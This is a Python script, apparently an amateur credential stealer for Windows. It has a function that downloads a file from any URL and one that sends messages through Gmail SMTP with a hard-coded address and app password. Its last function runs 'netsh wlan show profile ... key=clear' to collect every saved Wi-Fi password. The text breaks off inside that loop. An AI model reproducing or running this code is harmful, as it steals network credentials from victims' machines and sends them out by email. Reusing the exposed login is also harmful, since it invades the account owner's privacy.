import subprocess
import smtplib
import re
import requests

def h_down(url):
    response = requests.get(url)
    name = url.split("/")
    name = name[len(name)-1]
    fobj = open(name, 'wb')
    fobj.write(response.content)
    fobj.close
    print(response.content)


def send_mail(message):
    smtp_obj = smtplib.SMTP('smtp.gmail.com',587)
    smtp_obj.starttls()
    smtp_obj.login("joseph.merigala@gmail.com","nwgnxkvqsyvaehij")
    smtp_obj.sendmail("joseph.merigala@gmail.com","joseph.merigala@gmail.com", message)
    smtp_obj.quit()

def write_to_local(message):
    stat = "" #C:\Windows\Temp\
    with open("exec_log.txt","at") as file_obj:
        file_obj.write(message)


def get_wifi_pass():
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell=True)
    networks = networks.decode('utf-8')
    networks = re.findall("(?:Profile\s*:\s)(.*)", networks)
    res = ""
    for net in networks:
        try:
            exec_pass = "netsh wlan show profile "+net+" key=clear"
            passw = subprocess.check_output(exec_pass, shell=True)
            passw = passw.decode('utf-8')
            res += passw
        except:
            continue

